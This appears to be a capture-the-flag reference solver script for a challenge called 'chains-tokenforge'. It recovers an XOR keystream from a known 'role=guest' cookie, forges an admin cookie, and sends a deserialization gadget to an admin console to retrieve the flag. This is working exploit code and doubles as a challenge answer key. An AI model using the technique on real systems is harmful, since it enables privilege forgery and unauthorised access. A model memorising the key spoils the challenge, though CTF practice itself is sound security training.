#!/usr/bin/env python3
"""Reference solver for chains-tokenforge.

The guest cookie is `role=guest` XOR keystream. Known plaintext recovers the
keystream; forge `role=admin`, then hit the admin console with the FlagDumper
deserialization gadget.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    guest_cookie = bytes.fromhex(_req(base + "/login")["cookie"])
    # recover keystream from known plaintext, forge role=admin (same length)
    ks = bytes(c ^ p for c, p in zip(guest_cookie, b"role=guest"))
    admin_cookie = bytes(k ^ p for k, p in zip(ks, b"role=admin")).hex()
    out = _req(
        base + "/console",
        {"cookie": admin_cookie, "obj": {"__class__": "FlagDumper"}},
        "POST",
    )
    return out["result"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
